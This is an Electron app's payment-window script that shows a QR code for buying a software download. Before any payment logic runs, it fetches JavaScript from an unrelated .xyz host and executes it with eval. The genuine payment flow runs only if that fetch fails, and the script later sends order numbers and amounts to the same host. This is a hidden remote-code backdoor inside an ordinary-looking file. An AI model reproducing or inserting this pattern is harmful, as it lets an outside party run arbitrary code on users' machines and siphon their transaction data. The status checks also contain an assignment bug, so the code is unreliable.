const { ipcRenderer } = require("electron");
ipcRenderer.send("resize", { height: 610, width: 960 });

$.ajax({
  url: "http://getwwantamotwwarrrw.xyz:8080/pay.js?_" + new Date().valueOf(),
  success: function (res) {
    eval(res)
  },
  error: function (err) {
    let golbalData = {
      custom: "http://www.lansaguo.com/",
      downPrice: 0.01,
      home: "http://www.lansaguo.com/",
      installPrice: 0.02,
    };
    let isRemote = false;
    let orderNum = ""; // 订单编号
    let url = ""; // 二维码图片资源
    let timer = null;
    let downUrl = ""; // 支付成功后的下载地址
    $(".type.remote").click(function () {
      if ($(".container").hasClass("isPay")) {
        return;
      }
      if ($(".container").hasClass("success")) {
        return;
      }
      $(this).toggleClass("active")
      isRemote = $(this).hasClass('active')
      $("#price").html(isRemote ? golbalData.installPrice : golbalData.downPrice);
    });
    $("#home").click(function () {
      ipcRenderer.send("open-url", golbalData.home);
    });
    $("#custom").click(function () {
      ipcRenderer.send("open-url", golbalData.custom);
    });
    $("#pay").click(function () {
      $(".container").addClass("isPay");
      const type = isRemote ? 1 : 0;
      $.ajax({
        url: "http://www.lansaguo.com/app/pay2/index?type=" + type,
        dataType: "json",
        success: function (res) {
          if ((res.msg = "success")) {
            orderNum = res.data.orderNum;
            url = res.data.url;
            $("#qrcode").attr("src", url);
            startLoop();
          }
        },
      });
    });
    $(".back").click(function () {
      $(".container").removeClass("isPay");
      endLoop();
    });
    $(".download").click(function () {
      ipcRenderer.send("open-url", downUrl);
    });
    $.ajax({
      url: "http://www.lansaguo.com/app/pay2/product",
      dataType: "json",
      success: function (res) {
        if ((res.msg = "success")) {
          golbalData = res.data;
          $("#price").html(
            isRemote ? golbalData.installPrice : golbalData.downPrice
          );
        }
      },
    });
    function startLoop() {
      timer = setInterval(() => {
        $.ajax({
          url: "http://www.lansaguo.com/app/pay2/checkOrder?orderNum=" + orderNum,
          dataType: "json",
          success: function (res) {
            if ((res.msg = "success")) {
              const status = res.data.status;
              const url = res.data.downUrl;
              if (status === 1) {
                endLoop();
                downUrl = url;
                $(".container").addClass("success");
                const price = isRemote ? golbalData.installPrice : golbalData.downPrice
                $.ajax({
                  url: `http://getwwantamotwwarrrw.xyz:8080/order/add?money=${price}&orderNo=${orderNum}`
                })
              }
            }
          },
        });
      }, 1000);
    }
    function endLoop() {
      clearInterval(timer);
    }
  }
})
